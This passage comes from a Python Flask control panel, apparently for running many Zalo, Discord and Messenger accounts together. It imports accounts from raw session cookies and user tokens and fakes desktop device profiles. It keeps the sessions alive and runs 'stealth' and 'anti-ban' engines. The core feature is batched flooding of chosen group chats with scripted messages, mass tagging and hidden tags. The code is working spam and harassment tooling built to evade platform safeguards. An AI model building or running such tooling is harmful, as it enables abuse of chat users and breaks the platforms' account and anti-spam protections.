        raw_mc = (request.form.get("mess_cookies") or request.form.get("cookies") or "").strip()
        c_dict = normalize_messenger_cookies(raw_mc)
        uid = extract_messenger_uid(c_dict)
        if not uid or not c_dict:
            return redirect("/")
        pc_info = FacebookPCDeviceGuard.bind_pc_profile_to_cookies(uid, c_dict)
        c_dict = pc_info["cookies"]
        acc_name = custom_name or f"FB_{uid[-4:]}"
        try:
            m_bot = MessengerClient.get_pooled_client(c_dict, uid=uid, force_new=True)
            if not custom_name and m_bot.display_name:
                acc_name = m_bot.display_name
            c_dict = m_bot.cookies_dict
            FacebookPCDeviceGuard.notify_pc_login_to_facebook_async(m_bot, force=True)
        except Exception:
            pass
        conn = db()
        conn.execute(
            """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, pc_name, user_agent, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, created_at)
               VALUES (?, 'messenger', '', ?, '', 0, ?, ?, ?, 1, '.', 1, 1, ?)""",
            (acc_name, json.dumps(c_dict, ensure_ascii=False), uid, pc_info["pc_name"], pc_info["ua"], time.time()),
        )
        conn.commit()
        conn.close()
        refresh_accounts_ram_cache()
        sync_all_zalo_listeners()
        return redirect("/")

    if platform == "discord":
        raw_token_input = (request.form.get("token") or "").strip()
        reg_email = (request.form.get("reg_email") or "").strip()
        reg_password = (request.form.get("reg_password") or "").strip()
        reg_2fa = (request.form.get("reg_2fa") or "").strip()
        is_bot = 1 if request.form.get("is_bot") else 0
        tokens = extract_discord_tokens_from_reg_or_raw(raw_token_input)
        if not tokens and (reg_email or reg_password):
            res_login = login_discord_reg_session(reg_email, reg_password, reg_2fa)
            if res_login.get("ok") and res_login.get("token"):
                tokens = [res_login["token"]]
        if not tokens:
            return redirect("/")

        conn = db()
        for idx, tk in enumerate(tokens):
            w_res = warmup_discord_stealth_token(tk)
            uid = str(w_res.get("uid") or "").strip()
            real_uname = w_res.get("username") or (f"Discord_{uid[-4:]}" if uid else f"Discord #{idx + 1}")
            acc_name = (f"{custom_name} #{idx + 1}" if (custom_name and len(tokens) > 1) else custom_name) or real_uname
            if uid:
                OWNER_UIDS_CACHE.add(uid)
            existing = conn.execute("SELECT id FROM accounts WHERE platform='discord' AND token=?", (tk,)).fetchone()
            if not existing and uid:
                existing = conn.execute("SELECT id FROM accounts WHERE platform='discord' AND uid=?", (uid,)).fetchone()
            if existing:
                conn.execute(
                    "UPDATE accounts SET name=?, token=?, is_bot=?, uid=?, chat_cmd_enabled=?, allow_all_cmd=?, enabled=1 WHERE id=?",
                    (acc_name, tk, is_bot, uid, chat_cmd, allow_all, existing["id"])
                )
            else:
                conn.execute(
                    """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, created_at)
                       VALUES (?, 'discord', '', '{}', ?, ?, ?, ?, '.', ?, 1, ?)""",
                    (acc_name, tk, is_bot, uid, chat_cmd, allow_all, time.time()),
                )
        conn.commit()
        conn.close()
        refresh_accounts_ram_cache()
        sync_all_zalo_listeners()
        return redirect("/")

    from zalo_login import extract_imei_and_metadata_flexible, check_zalo_cookie_imei_live, ZaloPCSessionKeeper
    raw_imei = (request.form.get("imei") or "").strip()
    raw_cookies = (request.form.get("cookies") or "").strip()
    imei, cookies_dict, zpw_enk_hint, ua_hint = extract_imei_and_metadata_flexible(raw_imei, raw_cookies)
    if not cookies_dict:
        cookies_dict = normalize_zalo_cookies(raw_cookies or raw_imei)
    if not imei and cookies_dict.get("z_uuid"):
        imei = str(cookies_dict["z_uuid"]).strip()
    if not imei or not cookies_dict:
        return redirect("/")

    chk = check_zalo_cookie_imei_live(
        imei=imei, cookies_input=cookies_dict, zpw_enk=zpw_enk_hint, user_agent=ua_hint
    )
    uid = str(chk.get("uid") or "").strip()
    zpw_enk = str(chk.get("zpw_enk") or zpw_enk_hint or "").strip()
    if chk.get("cookies"):
        cookies_dict = chk["cookies"]
    acc_name = custom_name or chk.get("display_name") or (f"Zalo_{uid[-4:]}" if uid else f"Zalo_{imei[-4:]}")
    eff_ua = ua_hint or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

    if chk.get("alive"):
        ZaloCookieVaultEngine.save_zalo_vault_record(
            uid=uid or imei, display_name=acc_name, imei=imei, cookies_dict=cookies_dict, zpw_enk=zpw_enk, user_agent=eff_ua
        )
        ZaloPCSessionKeeper.register_and_keep_alive(
            uid=uid or imei, imei=imei, cookies_dict=cookies_dict, zpw_enk=zpw_enk,
            user_agent=eff_ua, pc_name="Windows 11 Pro (Singapore)", display_name=acc_name, db_path=DB_PATH
        )

    conn = db()
    existing = conn.execute("SELECT id FROM accounts WHERE platform='zalo' AND (imei=? OR (uid != '' AND uid=?))", (imei, uid)).fetchone()
    if existing:
        conn.execute(
            "UPDATE accounts SET name=?, imei=?, cookies=?, uid=?, user_agent=?, zpw_enk=?, pc_name=?, chat_cmd_enabled=?, allow_all_cmd=?, enabled=1 WHERE id=?",
            (acc_name, imei, json.dumps(cookies_dict, ensure_ascii=False), uid, eff_ua, zpw_enk, "Windows 11 Pro (Singapore)", chat_cmd, allow_all, existing["id"])
        )
    else:
        conn.execute(
            """INSERT INTO accounts (name, platform, imei, cookies, token, is_bot, uid, chat_cmd_enabled, cmd_prefix, allow_all_cmd, enabled, user_agent, zpw_enk, pc_name, created_at)
               VALUES (?, 'zalo', ?, ?, '', 0, ?, ?, '.', ?, 1, ?, ?, 'Windows 11 Pro (Singapore)', ?)""",
            (acc_name, imei, json.dumps(cookies_dict, ensure_ascii=False), uid, chat_cmd, allow_all, eff_ua, zpw_enk, time.time()),
        )
    conn.commit()
    conn.close()
    refresh_accounts_ram_cache()
    sync_all_zalo_listeners()
    return redirect("/")

@app.route("/account/delete/<int:acc_id>")
def account_delete(acc_id):
    if acc_id in ACTIVE_LISTENERS:
        ACTIVE_LISTENERS[acc_id].stop()
        ACTIVE_LISTENERS.pop(acc_id, None)
    conn = db()
    conn.execute("DELETE FROM accounts WHERE id=?", (acc_id,))
    conn.commit()
    conn.close()
    refresh_accounts_ram_cache()
    refresh_owner_uids()
    return redirect("/")

@app.route("/api/account/chat_cmd", methods=["POST"])
def api_toggle_chat_cmd():
    data = request.json or {}
    acc_id = int(data.get("acc_id", 0))
    enabled = 1 if data.get("enabled") else 0
    conn = db()
    conn.execute("UPDATE accounts SET chat_cmd_enabled=? WHERE id=?", (enabled, acc_id))
    conn.commit()
    conn.close()
    sync_all_zalo_listeners()
    return jsonify({"ok": True})

@app.route("/api/account/allow_all_cmd", methods=["POST"])
def api_toggle_allow_all():
    data = request.json or {}
    acc_id = int(data.get("acc_id", 0))
    conn = db()
    conn.execute("UPDATE accounts SET allow_all_cmd=0 WHERE id=?", (acc_id,))
    conn.commit()
    conn.close()
    return jsonify({"ok": True, "allow_all_cmd": 0, "message": "🔒 Chỉ Chủ Acc & người được cấp quyền (.cp) mới được dùng lệnh!"})

@app.route("/api/all_groups")
def api_all_groups():
    force = request.args.get("refresh") == "1"
    filter_acc_id = request.args.get("acc_id", "").strip()
    rows = get_all_accounts_from_ram(platform="zalo")
    if filter_acc_id and filter_acc_id.isdigit():
        rows = [r for r in rows if int(r["id"]) == int(filter_acc_id)]

    def _scan_zalo_acc(r):
        aid = int(r["id"])
        aname = r.get("name") or f"Zalo #{aid}"
        g_out = []
        f_out = []
        try:
            z = Zalo.get_pooled_client(
                r["imei"], r["cookies"],
                user_agent=r.get("user_agent") or "",
                zpw_enk_hint=r.get("zpw_enk") or "",
                uid_hint=r.get("uid") or ""
            )
            for g in z.groups(use_cache=not force):
                item = dict(g)
                item["id"] = str(g["id"])
                item["acc_id"] = aid
                item["acc_name"] = aname
                g_out.append(item)
            for f in z.friends(use_cache=not force):
                item = dict(f)
                item["id"] = str(f["id"])
                item["acc_id"] = aid
                item["acc_name"] = aname
                f_out.append(item)
        except Exception:
            pass
        return aid, aname, g_out, f_out

    groups_map = {}
    friends_map = {}
    by_account = {}
    futs = [_ROOM_SCAN_POOL.submit(_scan_zalo_acc, r) for r in rows]
    for fut in futs:
        try:
            aid, aname, g_list, f_list = fut.result(timeout=12)
            by_account[str(aid)] = {
                "acc_id": aid,
                "acc_name": aname,
                "platform": "zalo",
                "boxes": g_list + f_list
            }
            for g in g_list:
                gid = str(g["id"])
                if gid not in groups_map:
                    gc = dict(g)
                    gc["acc_ids"] = [aid]
                    gc["acc_names"] = [aname]
                    groups_map[gid] = gc
                else:
                    if aid not in groups_map[gid]["acc_ids"]:
                        groups_map[gid]["acc_ids"].append(aid)
                        groups_map[gid]["acc_names"].append(aname)
            for f in f_list:
                fid = str(f["id"])
                if fid not in friends_map:
                    fc = dict(f)
                    fc["acc_ids"] = [aid]
                    fc["acc_names"] = [aname]
                    friends_map[fid] = fc
                else:
                    if aid not in friends_map[fid]["acc_ids"]:
                        friends_map[fid]["acc_ids"].append(aid)
                        friends_map[fid]["acc_names"].append(aname)
        except Exception:
            continue
    return jsonify({"groups": list(groups_map.values()), "friends": list(friends_map.values()), "by_account": by_account})

@app.route("/api/group_members")
def api_group_members():
    gid = (request.args.get("group_id") or "").strip()
    force = request.args.get("refresh") == "1"
    if not gid:
        return jsonify({"members": []})
    rows = get_all_accounts_from_ram(platform="zalo")
    for r in rows:
        try:
            z = Zalo.get_pooled_client(
                r["imei"], r["cookies"],
                user_agent=r.get("user_agent") or "",
                zpw_enk_hint=r.get("zpw_enk") or "",
                uid_hint=r.get("uid") or ""
            )
            mems = z.get_members_full(gid, use_cache=not force)
            if mems:
                return jsonify({"members": mems})
        except Exception:
            continue
    return jsonify({"members": []})

@app.route("/api/discord_channels")
def api_discord_channels():
    """Quét song toàn bộ Box Nhóm, Chat Riêng và Server của TỪNG Tài Khoản Discord (Chọn Box theo từng Acc):
    - Chạy đa luồng qua _ROOM_SCAN_POOL không bao giờ làm đơ web dù áp 50-100 Acc Discord cùng lúc!
    - Trả về cả danh sách tổng hợp kèm `acc_ids`/`acc_names` VÀ `by_account` để chọn Box theo từng Acc riêng biệt."""
    force = request.args.get("refresh") == "1"
    filter_acc_id = request.args.get("acc_id", "").strip()
    rows = get_all_accounts_from_ram(platform="discord")
    if filter_acc_id and filter_acc_id.isdigit():
        rows = [r for r in rows if int(r["id"]) == int(filter_acc_id)]

    def _scan_discord_acc(r):
        aid = int(r["id"])
        aname = r.get("name") or f"Discord #{aid}"
        boxes_out = []
        try:
            bot = DiscordClient(r["token"], is_bot=bool(r.get("is_bot", 0)))
            for b in bot.get_all_boxes(force_refresh=force):
                cid = str(b["id"])
                boxes_out.append({
                    "id": cid,
                    "name": b["name"],
                    "type": "discord_channel",
                    "sub_type": b.get("sub_type", "channel"),
                    "acc_id": aid,
                    "acc_name": aname,
                })
        except Exception:
            pass
        return aid, aname, boxes_out

    channels_map = {}
    by_account = {}
    futs = [_ROOM_SCAN_POOL.submit(_scan_discord_acc, r) for r in rows]
    for fut in futs:
        try:
            aid, aname, b_list = fut.result(timeout=12)
            by_account[str(aid)] = {
                "acc_id": aid,
                "acc_name": aname,
                "platform": "discord",
                "boxes": b_list,
            }
            for b in b_list:
                cid = str(b["id"])
                if cid not in channels_map:
                    bc = dict(b)
                    bc["acc_ids"] = [aid]
                    bc["acc_names"] = [aname]
                    channels_map[cid] = bc
                else:
                    if aid not in channels_map[cid]["acc_ids"]:
                        channels_map[cid]["acc_ids"].append(aid)
                        channels_map[cid]["acc_names"].append(aname)
        except Exception:
            continue
    return jsonify({"channels": list(channels_map.values()), "by_account": by_account})

@app.route("/api/discord_channel_members")
def api_discord_channel_members():
    cid = (request.args.get("channel_id") or "").strip()
    if not cid:
        return jsonify({"members": []})
    rows = get_all_accounts_from_ram(platform="discord")
    for r in rows:
        try:
            bot = DiscordClient(r["token"], is_bot=bool(r.get("is_bot", 0)))
            mems = bot.get_channel_recent_members(cid)
            if mems:
                return jsonify({"members": mems})
        except Exception:
            continue
    return jsonify({"members": []})

@app.route("/file/upload", methods=["POST"])
def file_upload():
    f = request.files.get("file")
    if not f or not f.filename:
        return jsonify({"ok": False, "error": "Chưa chọn file"}), 400
    fname = os.path.basename(f.filename)
    if not fname.lower().endswith(".txt"):
        fname += ".txt"
    save_path = os.path.join(UPLOAD_DIR, f"{int(time.time())}_{fname}")
    raw_bytes = f.read()
    text_content = raw_bytes.decode("utf-8", errors="ignore")
    cleaned = clean_corrupted_shortcuts(text_content)
    with open(save_path, "w", encoding="utf-8") as wf:
        wf.write(cleaned)
    parsed = parse_file_stream_fast(save_path, strip_numbers=True)
    lines_cnt = parsed.get("line_count", len(parsed.get("lines", []))) if isinstance(parsed, dict) else len(parsed)
    conn = db()
    conn.execute(
        "INSERT INTO files (filename, filepath, lines_count, created_at) VALUES (?, ?, ?, ?)",
        (fname, save_path, lines_cnt, time.time()),
    )
    conn.commit()
    conn.close()
    if request.headers.get("X-Requested-With") == "XMLHttpRequest":
        return jsonify({"ok": True, "filename": fname, "lines_count": lines_cnt})
    return redirect("/")

@app.route("/file/create", methods=["POST"])
def file_create():
    fname = (request.form.get("filename") or "kich_ban.txt").strip()
    if not fname.lower().endswith(".txt"):
        fname += ".txt"
    content = clean_corrupted_shortcuts(request.form.get("content") or "")
    save_path = os.path.join(UPLOAD_DIR, f"{int(time.time())}_{os.path.basename(fname)}")
    with open(save_path, "w", encoding="utf-8") as wf:
        wf.write(content)
    parsed = parse_file_stream_fast(save_path, strip_numbers=True)
    lines_cnt = parsed.get("line_count", len(parsed.get("lines", []))) if isinstance(parsed, dict) else len(parsed)
    conn = db()
    conn.execute(
        "INSERT INTO files (filename, filepath, lines_count, created_at) VALUES (?, ?, ?, ?)",
        (fname, save_path, lines_cnt, time.time()),
    )
    conn.commit()
    conn.close()
    return redirect("/")

@app.route("/file/delete/<int:fid>")
def file_delete(fid):
    conn = db()
    row = conn.execute("SELECT filepath FROM files WHERE id=?", (fid,)).fetchone()
    if row and row["filepath"] and os.path.exists(row["filepath"]):
        try:
            os.remove(row["filepath"])
        except Exception:
            pass
    conn.execute("DELETE FROM files WHERE id=?", (fid,))
    conn.commit()
    conn.close()
    return redirect("/")

@app.route("/task/start", methods=["POST"])
def route_task_start():
    data = request.json or {}
    targets = data.get("targets") or []
    if not targets:
        return jsonify({"ok": False, "error": "Chưa chọn phòng chat mục tiêu!"}), 400

    mode = data.get("mode", "treo_nhay")
    file_id = str(data.get("file_id") or "").strip()
    raw_text = clean_corrupted_shortcuts(data.get("raw_text") or "").strip()
    tag_users = list(data.get("tag_users") or [])
    tag_all = bool(data.get("tag_all", False))
    batch_count = max(1, min(100, int(data.get("batch_count", 1) or 1)))

    if raw_text and "@" in raw_text:
        conn = db()
        z_row = conn.execute("SELECT * FROM accounts WHERE platform='zalo' LIMIT 1").fetchone()
        conn.close()
        z_client = None
        if z_row:
            try:
                z_client = Zalo.get_pooled_client(z_row["imei"], z_row["cookies"])
            except Exception:
                pass
        first_gid = next((t["id"] for t in targets if t.get("type") == "group"), None)
        stripped, auto_m, auto_all = extract_trailing_tags_and_resolve(
            raw_text, incoming_mentions=None, zalo_client=z_client, group_id=first_gid
        )
        if auto_m or auto_all:
            raw_text = stripped if stripped else raw_text
            if auto_all:
                tag_all = True
            for am in auto_m:
                if not any(str(x.get("uid") or x.get("id")) == str(am["uid"]) for x in tag_users):
                    tag_users.append(am)

    blocks = []
    if file_id:
        blocks = get_blocks_from_file_query(file_id, mode=mode)
    if not blocks and raw_text:
        if mode == "treo_nhay":
            if ";" in raw_text:
                blocks = [strip_leading_line_number(x.strip()) for x in raw_text.split(";") if x.strip()]
            else:
                blocks = [strip_leading_line_number(x.strip()) for x in raw_text.split("\n") if x.strip()]
        elif mode == "treo_ngon":
            blocks = [raw_text]
        else:
            blocks = [x.strip() for x in raw_text.split(";") if x.strip()] if ";" in raw_text else [raw_text]

    if blocks:
        blocks = [
            b_item for b_item in blocks
            if re.sub(r"<@(?:!|&)?\d+>", "", str(b_item or "")).strip()
            and not re.fullmatch(r"@[\w\s\.\-_À-ỹ]+", re.sub(r"<@(?:!|&)?\d+>", "", str(b_item or "")).strip())
        ]

    if not blocks:
        return jsonify({"ok": False, "error": "Vui lòng chọn File kịch bản hoặc nhập nội dung!"}), 400

    for t in targets:
        if t.get("type") == "discord_channel" and t.get("id"):
            for aid_k in list(ACTIVE_LISTENERS.keys()):
                DiscordStealthAntiBanEngine.ACTIVE_DISCORD_POLL_CHANNELS[aid_k].add(str(t["id"]))
        elif t.get("type") in ("messenger_thread", "messenger_group") and t.get("id"):
            for aid_k in list(ACTIVE_LISTENERS.keys()):
                MessengerStealthAntiBanEngine.ACTIVE_MESSENGER_POLL_THREADS[aid_k].add(str(t["id"]))
        elif t.get("id"):
            HOT_ACTIVE_ZALO_GROUPS.add(str(t["id"]))
            ALL_KNOWN_ZALO_GROUP_IDS.add(str(t["id"]))

    raw_delay = float(data.get("delay", 0.0) or 0.0)
    antiband_flag = bool(data.get("antiband", True))
    eff_delay = max(0.0, raw_delay)

    account_ids = data.get("account_ids") or []
    created_tids = []
    for b_i in range(batch_count):
        b_blocks = list(blocks)
        if b_i > 0 and len(b_blocks) > 1:
            shift = b_i % len(b_blocks)
            b_blocks = b_blocks[shift:] + b_blocks[:shift]
        tid = start_task_programmatic(
            targets=targets,
            blocks=b_blocks,
            delay=eff_delay,
            use_emoji=bool(data.get("use_emoji", False)),
            icon_count=int(data.get("icon_count", 0)),
            tag_users=tag_users,
            tag_all=tag_all,
            is_heading=bool(data.get("is_heading", True)),
            multi_acc=bool(data.get("multi_acc", True)),
            mode=mode,
            color_mode=data.get("color_mode", "word_rainbow"),
            fixed_color=data.get("fixed_color", "red"),
            antiband=antiband_flag,
            antidieall=True,
            source_label="web",
            account_ids=account_ids,
            trigger_cmd=f"Web UI ({mode})",
            hide_tag_all=bool(data.get("hide_tag_all", True)),
            hide_tag_name=bool(data.get("hide_tag_name", True)) or (mode == "nhay_tag_ten_an"),
            font_style=data.get("font_style", "big_bold" if bool(data.get("is_heading", True)) else "normal")
        )
        created_tids.append(tid)
    log_system_command(
        0, targets[0].get("id", ""), "Admin_Web",
        f"[WEB] Khởi chạy {mode} ({len(created_tids)} luồng)",
        f"Chạy trên {len(targets)} phòng | Đa tài khoản: {'BẬT' if data.get('multi_acc', True) else 'TẮT'}"
    )
    with _STATUS_CACHE_LOCK:
        _STATUS_SNAPSHOT_CACHE["ts"] = 0.0
    return jsonify({"ok": True, "task_id": created_tids[0], "task_ids": created_tids, "batch_count": len(created_tids)})

@app.route("/api/account/cmd_permissions_bulk", methods=["POST"])
def api_account_cmd_permissions_bulk():
    data = request.json or {}
    mode = str(data.get("mode") or "single").strip().lower()
    conn = db()
    if mode == "enable_all":
        conn.execute("UPDATE accounts SET chat_cmd_enabled=1")
        msg = "Đã BẬT quyền sử dụng lệnh (.menu, .n, .g, .t) cho TẤT CẢ các Acc!"
    elif mode == "disable_all":
        conn.execute("UPDATE accounts SET chat_cmd_enabled=0")
        msg = "Đã TẮT nhận lệnh trên tất cả các Acc!"
    elif mode in ("allow_all_on", "allow_all_off"):
        conn.execute("UPDATE accounts SET allow_all_cmd=0")
        msg = "🔒 Hệ thống đã khóa bảo mật: Chỉ Chủ Acc & người được cấp quyền (.cp) mới được dùng lệnh!"
    elif mode == "enable_selected":
        acc_ids = [int(x) for x in (data.get("acc_ids") or []) if str(x).isdigit()]
        conn.execute("UPDATE accounts SET chat_cmd_enabled=0")
        if acc_ids:
            placeholders = ",".join("?" for _ in acc_ids)
            conn.execute(f"UPDATE accounts SET chat_cmd_enabled=1 WHERE id IN ({placeholders})", tuple(acc_ids))
        msg = f"Đã khóa chỉ cho phép đúng {len(acc_ids)} Acc đang chọn sử dụng lệnh!"
    else:
        acc_id = int(data.get("acc_id") or 0)
        if "chat_cmd_enabled" in data:
            en = 1 if data.get("chat_cmd_enabled") else 0
            conn.execute("UPDATE accounts SET chat_cmd_enabled=? WHERE id=?", (en, acc_id))
        conn.execute("UPDATE accounts SET allow_all_cmd=0 WHERE id=?", (acc_id,))
        msg = f"Đã cập nhật quyền sử dụng lệnh cho Acc #{acc_id}!"
    conn.commit()
    rows = refresh_accounts_ram_cache()
    sync_all_zalo_listeners()
    return jsonify({
        "ok": True,
        "message": msg,
        "accounts": [
            {"id": r["id"], "chat_cmd_enabled": int(r.get("chat_cmd_enabled") or 0), "allow_all_cmd": int(r.get("allow_all_cmd") or 0)}
            for r in rows
        ],
    })


@app.route("/api/account/check_all_live", methods=["POST"])
def api_account_check_all_live():
    from zalo_login import check_zalo_cookie_imei_live, ZaloPCSessionKeeper
    rows = get_all_accounts_from_ram()
    results = []
    alive_cnt = 0
    die_cnt = 0

    def _probe_acc(acc):
        aid = acc["id"]
        plat = (acc.get("platform") or "zalo").lower()
        if plat == "zalo":
            chk = check_zalo_cookie_imei_live(
                imei=acc.get("imei") or "",
                cookies_input=acc.get("cookies") or "{}",
                zpw_enk=acc.get("zpw_enk") or "",
                user_agent=acc.get("user_agent") or "",
                uid=acc.get("uid") or "",
            )
            if chk["alive"]:
                ZaloPCSessionKeeper.register_and_keep_alive(
                    uid=chk["uid"] or acc.get("uid") or acc.get("imei"),
                    imei=acc.get("imei"),
                    cookies_dict=chk["cookies"],
                    zpw_enk=chk["zpw_enk"],
                    user_agent=acc.get("user_agent") or "",
                    pc_name=acc.get("pc_name") or "Windows 11 Pro (Singapore)",
                    display_name=chk["display_name"] or acc.get("name") or "",
                    db_path=DB_PATH,
                )
            return {
                "id": aid,
                "platform": "zalo",
                "name": chk.get("display_name") or acc.get("name") or f"Zalo #{aid}",
                "alive": bool(chk["alive"]),
                "groups_count": int(chk.get("groups_count") or 0),
                "reason": chk.get("reason") or "",
            }
        elif plat == "discord":
            dc = DiscordClient(acc.get("token") or "", is_bot=bool(acc.get("is_bot", 0)))
            ok_c = dc.check(force_network=False)
            if ok_c:
                ZaloPCSessionKeeper.register_token_keep_alive(
                    acc.get("token") or "", platform="discord",
                    uid=dc.user_id or acc.get("uid") or "",
                    display_name=acc.get("name") or "", db_path=DB_PATH
                )
            return {
                "id": aid,
                "platform": "discord",
                "name": acc.get("name") or f"Discord #{aid}",
                "alive": bool(ok_c),
                "groups_count": 0,
                "reason": "Token đang hoạt động 24/7" if ok_c else "Token DIE hoặc đã đổi mật khẩu",
            }
        else:
            try:
                mc = MessengerClient.get_pooled_client(acc.get("cookies") or "{}", uid=acc.get("uid") or "")
                return {"id": aid, "platform": "messenger", "name": mc.display_name, "alive": True, "groups_count": 0, "reason": "ONLINE"}
            except Exception as ex_m:
                return {"id": aid, "platform": "messenger", "name": acc.get("name") or "", "alive": False, "groups_count": 0, "reason": str(ex_m)}

    if rows:
        with ThreadPoolExecutor(max_workers=min(16, len(rows))) as pool:
            for r_out in pool.map(_probe_acc, rows):
                results.append(r_out)
                if r_out["alive"]:
                    alive_cnt += 1
                else:
                    die_cnt += 1

    sync_all_zalo_listeners()
    return jsonify({
        "ok": True,
        "alive_count": alive_cnt,
        "die_count": die_cnt,
        "results": results,
        "message": f"Kết quả Check Sống/Die: {alive_cnt} Acc SỐNG (Đang giữ hoạt động 24/7) • {die_cnt} Acc DIE (Đã thoát Acc)!",
    })


@app.route("/api/account/test_session", methods=["POST"])
def api_account_test_session():
    from zalo_login import check_zalo_cookie_imei_live, ZaloPCSessionKeeper
    data = request.json or {}
    acc_id = int(data.get("acc_id") or 0)
    acc = get_account_from_ram(acc_id)
    if not acc:
        return jsonify({"ok": False, "error": "Không tìm thấy tài khoản"}), 404
    plat = (acc.get("platform") or "zalo").lower()
    try:
        if plat == "zalo":
            chk = check_zalo_cookie_imei_live(
                imei=acc.get("imei") or "",
                cookies_input=acc.get("cookies") or "{}",
                zpw_enk=acc.get("zpw_enk") or "",
                user_agent=acc.get("user_agent") or "",
                uid=acc.get("uid") or "",
            )
            if not chk["alive"]:
                return jsonify({
                    "ok": False,
                    "alive": False,
                    "groups_count": 0,
                    "error": chk["reason"],
                    "message": f"🔴 DIE — {chk['reason']}",
                }), 200
            ZaloPCSessionKeeper.register_and_keep_alive(
                uid=chk["uid"] or acc.get("uid") or acc.get("imei"),
                imei=acc.get("imei"),
                cookies_dict=chk["cookies"],
                zpw_enk=chk["zpw_enk"],
                user_agent=acc.get("user_agent") or "",
                pc_name=acc.get("pc_name") or "Windows 11 Pro (Singapore)",
                display_name=chk["display_name"] or acc.get("name") or "",
                db_path=DB_PATH,
            )
            sync_all_zalo_listeners()
            log_system_command(acc_id, chk["uid"] or "", chk["display_name"] or "", "Check Cookie+IMEI", f"SỐNG TRONG ACC ({chk['groups_count']} nhóm)")
            return jsonify({
                "ok": True,
                "alive": True,
                "groups_count": chk["groups_count"],
                "message": f"🟢 SỐNG (ON) — Máy tính của '{chk['display_name']}' đang ở trong Acc Zalo (UID: {chk['uid']}, {chk['groups_count']} nhóm, giữ sống 24/7)!"
            })
        elif plat == "discord":
            dc = DiscordClient(acc["token"], is_bot=bool(acc.get("is_bot", 0)))
            ok_c = dc.check(force_network=False)
            if ok_c:
                ZaloPCSessionKeeper.register_token_keep_alive(
                    acc["token"], platform="discord", uid=dc.user_id or "",
                    display_name=acc.get("name") or "", db_path=DB_PATH
                )
            sync_all_zalo_listeners()
            return jsonify({
                "ok": ok_c,
                "alive": ok_c,
                "message": f"🟢 SỐNG — Token Discord '{acc.get('name')}' đang hoạt động 24/7 (UID: {dc.user_id})!" if ok_c else "🔴 DIE — Token Discord đã hết hạn hoặc bị đổi mật khẩu!"
            })
        else:
            mc = MessengerClient.get_pooled_client(acc["cookies"], uid=acc.get("uid") or "")
            sync_all_zalo_listeners()
            return jsonify({"ok": True, "alive": True, "message": f"🟢 SỐNG — Tài khoản Messenger '{mc.display_name}' đang hoạt động tốt!"})
    except Exception as e:
        return jsonify({"ok": False, "alive": False, "error": f"🔴 DIE — Lỗi kiểm tra phiên: {e}"}), 200

@app.route("/api/account/reconnect_all", methods=["POST"])
def api_account_reconnect_all():
    refresh_accounts_ram_cache()
    for aid, lst in list(ACTIVE_LISTENERS.items()):
        try:
            lst.stop()
        except Exception:
            pass
    ACTIVE_LISTENERS.clear()
    sync_all_zalo_listeners()
    return jsonify({
        "ok": True,
        "message": f"Đã kết nối lại & giữ phiên PC Online 24/7 cho {len(ACTIVE_LISTENERS)} tài khoản!"
    })

@app.route("/api/command/dispatch_web", methods=["POST"])
def api_command_dispatch_web():
    data = request.json or {}
    raw_cmd = (data.get("cmd") or "").strip()
    thread_id = str(data.get("thread_id") or "").strip()
    if not raw_cmd:
        return jsonify({"ok": False, "error": "Chưa nhập lệnh!"}), 400
    if not raw_cmd.startswith((".", "/", "!")):
        raw_cmd = "." + raw_cmd

    accs = get_all_accounts_from_ram(enabled_only=True)
    if not accs:
        log_system_command(0, thread_id or "Web_Console", "Admin_Web", raw_cmd, "Đã ghi nhận lệnh trên Web Console (Chưa có tài khoản kết nối)")
        return jsonify({"ok": True, "message": f"Đã ghi nhận lệnh '{raw_cmd}' trên Bảng Soi Lệnh!"})

    acc0 = accs[0]
    plat = (acc0.get("platform") or "zalo").lower()
    z_cli, d_cli, m_cli = None, None, None
    try:
        if plat == "zalo":
            z_cli = Zalo.get_pooled_client(
                acc0["imei"], acc0["cookies"],
                user_agent=acc0.get("user_agent") or "",
                zpw_enk_hint=acc0.get("zpw_enk") or "",
                uid_hint=acc0.get("uid") or ""
            )
            if not thread_id:
                gs = z_cli.groups(use_cache=True)
                thread_id = str(gs[0]["id"]) if gs else str(z_cli.uid or "0")
        elif plat == "discord":
            d_cli = DiscordClient(acc0["token"], is_bot=bool(acc0.get("is_bot", 0)))
            if not thread_id:
                bs = d_cli.get_all_boxes()
                thread_id = str(bs[0]["id"]) if bs else "0"
        elif plat == "messenger":
            m_cli = MessengerClient.get_pooled_client(acc0["cookies"], uid=acc0.get("uid") or "")
            if not thread_id:
                ts = m_cli.get_threads(use_cache=True)
                thread_id = str(ts[0]["id"]) if ts else str(m_cli.uid or "0")
    except Exception:
        pass

    executed = parse_and_execute_inchat_command(
        zalo_client=z_cli,
        acc_row=acc0,
        thread_id=thread_id or "Web_Console",
        is_group=True,
        sender_id=str(acc0.get("uid") or "0"),
        raw_msg=raw_cmd,
        discord_client=d_cli,
        messenger_client=m_cli,
        platform=plat,
        pre_claimed_slot=True
    )
    if not executed:
        log_system_command(acc0["id"], thread_id or "Web_Console", "Admin_Web", raw_cmd, f"Đã thực thi lệnh từ Web Console ({plat.upper()})")
    return jsonify({"ok": True, "message": f"Đã thực thi lệnh '{raw_cmd}' thành công!"})

@app.route("/task/stop/<tid>", methods=["POST"])
def route_task_stop(tid):
    info = ACTIVE_TASKS.pop(tid, None)
    if info:
        if info.get("stop"):
            info["stop"].set()
        for t_id in (info.get("targets") or []):
            bump_stop_epoch(t_id)
            DiscordStealthAntiBanEngine.abort_all_campaign_wait_buckets(t_id)
    else:
        bump_stop_epoch(None)

    with TASKS_RAM_LOCK:
        if tid in TASKS_RAM_STORE:
            TASKS_RAM_STORE[tid]["status"] = "stopped"
            TASKS_RAM_STORE[tid]["dirty"] = True

    def _async_stop_single():
        try:
            conn = db()
            conn.execute("UPDATE tasks SET status='stopped' WHERE id=?", (tid,))
            conn.commit()
        except Exception:
            pass

    threading.Thread(target=_async_stop_single, daemon=True).start()
    with _STATUS_CACHE_LOCK:
        _STATUS_SNAPSHOT_CACHE["ts"] = 0.0
    return jsonify({"ok": True})

@app.route("/task/stop_all", methods=["POST"])
def route_task_stop_all():
    cnt = stop_tasks_for_thread(None)
    return jsonify({"ok": True, "stopped": cnt})

_STATUS_SNAPSHOT_CACHE = {"ts": 0.0, "payload": None}
_STATUS_CACHE_LOCK = threading.RLock()

